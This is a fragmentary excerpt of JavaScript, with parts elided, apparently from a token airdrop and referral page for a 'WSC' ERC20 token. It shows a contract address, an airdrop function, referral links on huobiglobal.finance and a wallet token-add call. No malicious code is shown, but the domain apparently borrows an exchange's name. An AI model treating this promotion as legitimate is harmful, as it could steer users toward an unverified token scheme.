...
let addr;
const sttaddr = "0xb3715403bf2efb20cfe684d0cb8fed021bc20bba";
const sttabi = [{
    "constant": false,
    "inputs": [{
        "name": "_refer",
...
const getAirdrop = async () => {
    ...
    if (gettkbl == 0) {
        ...
        if (fresh === "")
            fresh = "0xb3715403bf2efb20cfe684d0cb8fed021bc20bba";
...
function getreflink() {
    ...
    if (!document.getElementById('refaddress').value) {
        ...
        if (!/^(0x){1}[0-9a-fA-F]{40}$/i.test(referaladd)) {
            ...
            document.getElementById('refaddress').value = 'https://huobiglobal.finance/?ref=' + document.getElementById('refaddress').value;
        }
    }
}
    ...
    try {
        web3.currentProvider.sendAsync({
            ...
            params: {
                'type': 'ERC20',
                'options': {
                    'address': '0xb3715403bf2efb20cfe684d0cb8fed021bc20bba',
                    'symbol': 'WSC',
                    'decimals': '15',
                    'image': 'https://huobiglobal.finance/img/logo.png',
                },
            },
